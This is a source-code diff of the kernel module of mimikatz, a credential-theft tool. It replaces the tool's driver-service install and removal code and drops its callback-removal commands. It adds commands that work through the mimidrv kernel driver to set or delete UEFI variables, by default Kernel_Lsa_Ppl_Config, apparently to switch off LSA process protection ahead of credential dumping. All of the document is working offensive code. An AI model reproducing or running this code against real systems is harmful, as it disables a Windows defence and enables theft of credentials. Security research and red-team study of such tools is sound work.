@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_kernel.h"
 
@@ -21,10 +21,10 @@ const KUHL_K_C kuhl_k_c_kernel[] = {
 	{NULL,								IOCTL_MIMIDRV_NOTIFY_IMAGE_LIST,	L"notifImage",		L"List image notify callbacks"},
 	{NULL,								IOCTL_MIMIDRV_NOTIFY_REG_LIST,		L"notifReg",		L"List registry notify callbacks"},
 	{NULL,								IOCTL_MIMIDRV_NOTIFY_OBJECT_LIST,	L"notifObject",		L"List object notify callbacks"},
-	{kuhl_m_kernel_notifyProcessRemove,	IOCTL_MIMIDRV_NOTIFY_PROCESS_REMOVE,L"notifProcessRemove",	L"Remove process notify callback"},
-	{kuhl_m_kernel_notifyObjectRemove,	IOCTL_MIMIDRV_NOTIFY_OBJECT_REMOVE,	L"notifObjectRemove",	L"Remove object notify callback"},
 	{NULL,								IOCTL_MIMIDRV_FILTER_LIST,			L"filters",			L"List FS filters"},
 	{NULL,								IOCTL_MIMIDRV_MINIFILTER_LIST,		L"minifilters",		L"List minifilters"},
+	{kuhl_m_kernel_sysenv_set,			0,		L"sysenvset",		L"System Environment Variable Set"},
+	{kuhl_m_kernel_sysenv_del,			0,		L"sysenvdel",		L"System Environment Variable Delete"},
 };
 
 NTSTATUS kuhl_m_kernel_do(wchar_t * input)
@@ -55,114 +55,21 @@ NTSTATUS kuhl_m_kernel_do(wchar_t * input)
 
 NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
 {
-	wchar_t *absFile, file[] = MIMIKATZ_DRIVER L".sys";
-	SC_HANDLE hSC = NULL, hS = NULL;
-
-
-	if(hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
+	wchar_t *absFile;
+	if(kull_m_file_getAbsolutePathOf(MIMIKATZ_DRIVER L".sys", &absFile))
 	{
-		if(hS = OpenService(hSC, MIMIKATZ_DRIVER, SERVICE_START))
-		{
-			kprintf(L"[+] mimikatz driver already registered\n");
-		}
-		else
-		{
-			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
-			{
-				kprintf(L"[*] mimikatz driver not present\n");
-				if(kull_m_file_getAbsolutePathOf(file, &absFile))
-				{
-					if(kull_m_file_isFileExist(absFile))
-					{
-						if(hS = CreateService(hSC, MIMIKATZ_DRIVER, L"mimikatz driver (" MIMIKATZ_DRIVER L")", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, absFile, NULL, NULL, NULL, NULL, NULL))
-						{
-							kprintf(L"[+] mimikatz driver successfully registered\n");
-
-							if(kuhl_m_kernel_addWorldToMimikatz(hS))
-								kprintf(L"[+] mimikatz driver ACL to everyone\n");
-							else PRINT_ERROR_AUTO(L"kuhl_m_kernel_addWorldToMimikatz");
-						}
-						else PRINT_ERROR_AUTO(L"CreateService");
-					}
-					else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
-
-					LocalFree(absFile);
-				}
-				else PRINT_ERROR_AUTO(L"kull_m_file_getAbsolutePathOf");
-			}
-			else PRINT_ERROR_AUTO(L"OpenService");
-		}
-		if(hS)
-		{
-			if(StartService(hS, 0, NULL))
-				kprintf(L"[+] mimikatz driver started\n");
-			else if(GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
-				kprintf(L"[*] mimikatz driver already started\n");
-			else
-				PRINT_ERROR_AUTO(L"StartService");
-			CloseServiceHandle(hS);
-		}
-		CloseServiceHandle(hSC);
+		if(kull_m_file_isFileExist(absFile))
+			kull_m_service_install(MIMIKATZ_DRIVER, MIMIKATZ L" driver (" MIMIKATZ_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
+		else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
+		LocalFree(absFile);
 	}
-	else PRINT_ERROR_AUTO(L"OpenSCManager(create)");
+	else PRINT_ERROR_AUTO(L"kull_m_file_getAbsolutePathOf");
 	return STATUS_SUCCESS;
-}
-
-BOOL kuhl_m_kernel_addWorldToMimikatz(SC_HANDLE monHandle)
-{
-	BOOL status = FALSE;
-	DWORD dwSizeNeeded;
-	PSECURITY_DESCRIPTOR oldSd, newSd;
-	SECURITY_DESCRIPTOR dummySdForXP;
-	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
-	EXPLICIT_ACCESS ForEveryOne = {
-		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
-		SET_ACCESS,
-		NO_INHERITANCE,
-		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
-	};
-	if(!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
-	{
-		if(oldSd = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR, dwSizeNeeded))
-		{
-			if(QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded))
-			{
-				if(AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID *)&ForEveryOne.Trustee.ptstrName))
-				{
-					if(BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS)
-					{
-						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
-						LocalFree(newSd);
-					}
-					FreeSid(ForEveryOne.Trustee.ptstrName);
-				}
-			}
-			LocalFree(oldSd);
-		}
-	}
-	return status;
 }
 
 NTSTATUS kuhl_m_kernel_remove_mimidrv(int argc, wchar_t * argv[])
 {
-	BOOL toRemove = TRUE;
-	if(kull_m_service_stop(MIMIKATZ_DRIVER))
-		kprintf(L"[+] mimikatz driver stopped\n");
-	else if(GetLastError() == ERROR_SERVICE_NOT_ACTIVE)
-		kprintf(L"[*] mimikatz driver not running\n");
-	else
-	{
-		toRemove = FALSE;
-		PRINT_ERROR_AUTO(L"kull_m_service_stop");
-	}
-
-	if(toRemove)
-	{
-		if(kull_m_service_remove(MIMIKATZ_DRIVER))
-			kprintf(L"[+] mimikatz driver removed\n");
-		else
-			PRINT_ERROR_AUTO(L"kull_m_service_remove");
-	}
+	kull_m_service_uninstall(MIMIKATZ_DRIVER);
 	return STATUS_SUCCESS;
 }
 
@@ -241,7 +148,6 @@ NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-
 NTSTATUS kuhl_m_kernel_processPrivilege(int argc, wchar_t * argv[])
 {
 	PCWCHAR szPid;
@@ -254,29 +160,99 @@ NTSTATUS kuhl_m_kernel_processPrivilege(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS kuhl_m_kernel_notifyProcessRemove(int argc, wchar_t * argv[])
+NTSTATUS kuhl_m_kernel_sysenv_set(int argc, wchar_t * argv[])
 {
-	return kuhl_m_kernel_notifyGenericRemove(argc, argv, IOCTL_MIMIDRV_NOTIFY_PROCESS_REMOVE);
-}
+	NTSTATUS status;
+	LPCWSTR szName, szGuid, szAttributes, szData;
+	UNICODE_STRING uName, uGuid;
+	GUID guid;
+	LPBYTE hex = NULL;
+	DWORD size, attributes, nameLen, structSize;
+	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv;
 
-NTSTATUS kuhl_m_kernel_notifyObjectRemove(int argc, wchar_t * argv[])
-{
-	return kuhl_m_kernel_notifyGenericRemove(argc, argv, IOCTL_MIMIDRV_NOTIFY_OBJECT_REMOVE);
-}
+	kull_m_string_args_byName(argc, argv, L"name", &szName, L"Kernel_Lsa_Ppl_Config");
+	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, L"{77fa9abd-0359-4d32-bd60-28f4e78f784b}");
+	kull_m_string_args_byName(argc, argv, L"attributes", &szAttributes, L"1");
+	kull_m_string_args_byName(argc, argv, L"data", &szData, L"00000000");
 
-NTSTATUS kuhl_m_kernel_notifyGenericRemove(int argc, wchar_t * argv[], DWORD code)
-{
-	PVOID p;
-	if(argc)
+	RtlInitUnicodeString(&uName, szName);
+	RtlInitUnicodeString(&uGuid, szGuid);
+	attributes = wcstoul(szAttributes, NULL, 0);
+
+	status = RtlGUIDFromString(&uGuid, &guid);
+	if(NT_SUCCESS(status))
 	{
-#ifdef _M_X64
-		p = (PVOID) _wcstoui64(argv[0], NULL, 0);
-#else ifdef _M_IX86
-		p = (PVOID) wcstoul(argv[0], NULL, 0);
-#endif
-		kprintf(L"Target = 0x%p\n", p);	
-		kull_m_kernel_mimidrv_simple_output(code, &p, sizeof(PVOID));
+		kprintf(L"Name       : %wZ\nVendor GUID: ", &uName);
+		kuhl_m_sysenv_display_vendorGuid(&guid);
+		kprintf(L"\nAttributes : %08x (", attributes);
+		kuhl_m_sysenv_display_attributes(attributes);
+		kprintf(L")\n");
+		if(kull_m_string_stringToHexBuffer(szData, &hex, &size))
+		{
+			kprintf(L"Length     : %u\nData       : ", size);
+			kull_m_string_wprintf_hex(hex, size, 1);
+			kprintf(L"\n\n");
+			nameLen = ((DWORD) wcslen(szName) + 1) * sizeof(wchar_t);
+			structSize = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen  + size;
+			if(vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) LocalAlloc(LPTR, structSize))
+			{
+				vnv->Attributes = attributes;
+				RtlCopyMemory(&vnv->VendorGuid, &guid, sizeof(GUID));
+				vnv->ValueLength = size;
+				vnv->ValueOffset = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen;
+				RtlCopyMemory(vnv->Name, szName, nameLen);
+				RtlCopyMemory((PBYTE) vnv + vnv->ValueOffset, hex, size);
+				if(kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_SYSENVSET, vnv, structSize))
+					kprintf(L"> OK!\n");
+				LocalFree(vnv);
+			}
+			LocalFree(hex);
+		}
 	}
-	else PRINT_ERROR(L"No address?\n");
+	else PRINT_ERROR(L"RtlGUIDFromString: 0x%08x\n", status);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_kernel_sysenv_del(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	LPCWSTR szName, szGuid, szAttributes;
+	UNICODE_STRING uName, uGuid;
+	GUID guid;
+	DWORD attributes, nameLen, structSize;
+	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv;
+
+	kull_m_string_args_byName(argc, argv, L"name", &szName, L"Kernel_Lsa_Ppl_Config");
+	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, L"{77fa9abd-0359-4d32-bd60-28f4e78f784b}");
+	kull_m_string_args_byName(argc, argv, L"attributes", &szAttributes, L"1");
+
+	RtlInitUnicodeString(&uName, szName);
+	RtlInitUnicodeString(&uGuid, szGuid);
+	attributes = wcstoul(szAttributes, NULL, 0);
+
+	status = RtlGUIDFromString(&uGuid, &guid);
+	if(NT_SUCCESS(status))
+	{
+		kprintf(L"Name       : %wZ\nVendor GUID: ", &uName);
+		kuhl_m_sysenv_display_vendorGuid(&guid);
+		kprintf(L"\nAttributes : %08x (", attributes);
+		kuhl_m_sysenv_display_attributes(attributes);
+		kprintf(L")\n\n");
+
+		nameLen = ((DWORD) wcslen(szName) + 1) * sizeof(wchar_t);
+		structSize = FIELD_OFFSET(MIMIDRV_VARIABLE_NAME_AND_VALUE, Name) + nameLen;
+		if(vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) LocalAlloc(LPTR, structSize))
+		{
+			vnv->Attributes = attributes;
+			RtlCopyMemory(&vnv->VendorGuid, &guid, sizeof(GUID));
+			vnv->ValueLength = 0;
+			vnv->ValueOffset = 0;
+			RtlCopyMemory(vnv->Name, szName, nameLen);
+			if(kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_SYSENVSET, vnv, structSize))
+				kprintf(L"> OK!\n");
+			LocalFree(vnv);
+		}
+	}
+	else PRINT_ERROR(L"RtlGUIDFromString: 0x%08x\n", status);
 	return STATUS_SUCCESS;
 }
